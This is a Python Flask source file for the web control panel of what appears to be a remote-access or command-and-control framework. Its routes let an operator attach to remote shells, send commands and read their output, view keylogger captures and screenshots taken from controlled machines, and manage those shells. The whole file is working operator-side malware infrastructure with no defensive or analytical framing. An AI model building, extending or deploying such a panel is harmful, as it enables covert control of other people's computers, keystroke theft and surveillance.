#!/usr/bin/python
# -*- coding: utf-8 -*-

import threading
import time
import os
import logging
from gevent.pywsgi import WSGIServer
from flask import redirect, url_for, request, render_template
from flask_socketio import SocketIO
from core.ui import UI
from core.log import Log
from core.utils import Utils
from core.version import Version
from core.webapi import FlaskFactory

errors = ["Wrong password", "Session was destroyed"]
version = Version.VERSION

app = FlaskFactory(__name__, root_path=os.getcwd(), template_folder=os.getcwd() + "/templates", static_folder=os.getcwd() + "/static")
websocket = SocketIO(app, async_handlers=True)


@app.route("/", defaults={"path": "login"})
@app.route("/<path:path>")
def catch_all(path):
    if "login" in path:
        return redirect(url_for("login"))
    elif "dashboard" in path:
        return redirect(url_for("dashboard"))
    return ""

@app.route("/login/<int:error>", methods=["GET", "POST"])
@app.route("/login", methods=["GET", "POST"], defaults={"error": None})
def login(error):
    if request.method == "POST":
        if app.post_login():
            return redirect(url_for("dashboard"))
        return redirect(url_for("login", error=1))

    if error:
        error = errors[error - 1]

    return render_template("login.html", error=error)

@app.route("/logout", methods=["GET"])
def logout():
    error = None
    if app.auth():
        app.logout()
        error = 2

    return redirect(url_for("login", error=error))

@app.route("/", methods=["GET"])
def index():
    if app.auth():
        return redirect(url_for("dashboard"))
    else:
        return redirect(url_for("login"))

@app.route("/dashboard", methods=["GET", "POST"])
def dashboard():
    if app.auth():
        return render_template("dashboard.html", \
            username=app.get_user(), host=app.get_ip(), port=app.get_port(),
            protocol=app.get_protocol(), payload_name=app.get_payload_name(),
            callback_url=app.get_payload_url(), gui_port=app.get_gui_port(),
            gui_password=app.get_gui_password(), gui_host=app.get_gui_host())
    else:
        return redirect(url_for("login"))

# Fetch new events
@app.route("/api/newEvents", methods=["GET", "POST"])
def new_events():
    if app.auth():
        return app.get_log_data(Log.get_current_date(), "dashboard")
    else:
        return redirect(url_for("login"))

@websocket.on("msg-sent")
def push_msg(json):
    if app.auth():
        if json["username"] != "":
            if json["message"] != "":
                websocket.emit("msg-received", json)
                json["timestamp"] = Utils.timestamp()
                app.send_msg(json)
                Log.log_chat(json["timestamp"], json["username"], json["message"])
    else:
        return redirect(url_for("login"))

# Fetch msgs
@app.route("/api/fetchMsgs", methods=["GET", "POST"])
def fetch_msgs():
    if app.auth():
        return render_template("msgs.html", msgs=app.get_msgs())
    else:
        return redirect(url_for("login"))

# Fetch list of logs by dates
@app.route("/api/fetchLogs/<name>", methods=["GET", "POST"])
def fetch_logs(name):
    if app.auth():
        return render_template("logs.html", output=False, dates=app.get_log_date(name), log_name=name)
    else:
        return redirect(url_for("login"))

# Fetch specific Log
@app.route("/api/fetchLog/<date>/<name>", methods=["GET", "POST"])
def fetch_log(date, name):
    if app.auth():
        extra = ["shell", "keylogger", "screenshot"]
        if name in extra:
            return render_template("logs.html", output=False, extra=True, log_name=name, log_extra=app.get_log_names(name))
        if "screenshot_" in name:
            return render_template("logs.html", output=False, screenshot=True, log_name=name, log_content=app.get_log_data(date, name))
        return render_template("logs.html", output=True, log_name=name, log_content=app.get_log_data(date, name))
    else:
        return redirect(url_for("login"))

@app.route("/api/fetchScreenshots/<id>", methods=["GET", "POST"])
def fetch_screenshots(id):
    if app.auth():
        screenshots = []
        if type(app.get_screenshots(id)) is str:
            return render_template("screenshots.html", screenshots=screenshots)
        else:
            for screenshot in app.get_screenshots(id):
                info = screenshot.split("/");path = info[-2];name = info[-1]
                screenshot = "%s/%s" % (path,name)
                if screenshot not in screenshots:
                    screenshots.append(screenshot)
            return render_template("screenshots.html", screenshots=screenshots)

@app.route("/api/fetchScreenshot/<date>/<id>", methods=["GET", "POST"])
def fetch_screenshot(date, id):
    if app.auth():
        return render_template("screenshot.html", screenshot=app.get_screenshot(date, id))

# List all active shells
@app.route("/api/listShells", methods=["GET", "POST"])
def list_shells():
    if app.auth():
        return render_template("shells.html", shells=app.get_shells(), uid=app.get_session_uid())
    else:
        return redirect(url_for("login"))

# Hook shell to user
@app.route("/api/attachShell/<uid>/<id>", methods=["GET", "POST"])
def attach_shell(uid, id):
    if app.auth():
        app.hook_shell(id)
        return ""
    else:
        return redirect(url_for("login"))

# Unhook shell from user
@app.route("/api/detachShell/<uid>/<id>", methods=["GET", "POST"])
def detach_shell(uid, id):
    if app.auth():
        app.unhook_shell(id)
        return ""
    else:
        return redirect(url_for("login"))


# Send cmd to shell
@app.route("/api/pushCmd/<id>", methods=["GET", "POST"])
def push_cmd(id):
    if app.auth():
        data = request.json
        username = data["user"]
        cmd = data["cmd"]
        if username == app.get_username():
            return app.send_cmd(id, cmd, username)
        else:
            return ""
    else:
        return redirect(url_for("login"))

# Fetch shell cmd output
@app.route("/api/fetchOutput/<id>", methods=["GET", "POST"])
def fetch_output(id):
    if app.auth():
        data = app.get_output(id)
        if len(data) == 0:
            return "__no_output__"
        else:
            output = "<b>[%s] Received Output:</b>\n%s" % (Utils.timestamp(), app.html_escape(data))
            return output
    else:
        return redirect(url_for("login"))

# Fetch shell cmd output
@app.route("/api/fetchInput/<id>", methods=["GET", "POST"])
def fetch_input(id):
    if app.auth():
        data = app.get_input(id)
        if data is not None:
            if len(data) == 0:
                return "__no_output__"
            else:
                output = "<b>[%s] %s</b>\n" % (Utils.timestamp(), app.html_escape(data))
                return output
    else:
        return redirect(url_for("login"))

# Fetch keylogger data from shell
@app.route("/api/fetchKeylogger/<id>", methods=["GET", "POST"])
def fetch_keylogger(id):
    if app.auth():
        return app.get_keylogger(id)
    else:
        return redirect(url_for("login"))

# Fetch shell data from shell
@app.route("/api/fetchShellLog/<id>", methods=["GET", "POST"])
def fetch_shell_log(id):
    if app.auth():
        return app.get_shell(id)
    else:
        return redirect(url_for("login"))

@app.route("/api/deleteShell/<id>", methods=["POST"])
def remove_shell(id):
    if app.auth():
        data = request.json
        username = data["user"]
        if username == app.get_username():
            app.delete_shell(id, username)
            return ""
        else:
            return ""
    else:
        return redirect(url_for("login"))

def init_flask_thread(config, cli):
    thread = threading.Thread(target=start_flask, args=(config, cli, ))
    thread.start()
    return thread

def start_flask(config, cli):
    prefix = "http://"

    if config.get("gui-https-enabled") == "on":
            prefix = "https://"

    UI.warn("Web GUI Started: %s%s:%s" % (prefix, config.get("gui-host"), config.get("gui-port")))
    UI.warn("Web GUI Password: %s" % config.get("server-password"))

    app.init(config, cli)
    try:
        if config.get("gui-https-enabled") == "on":
            cert = config.get("gui-https-cert-path")
            Utils.file_exists(cert, True)
            server = WSGIServer((config.get("gui-host"), int(config.get("gui-port"))), app, log=None, keyfile=cert, certfile=cert)
        else:
            server = WSGIServer((config.get("gui-host"), int(config.get("gui-port"))), app, log=None)

        server.serve_forever()
    except:
        pass
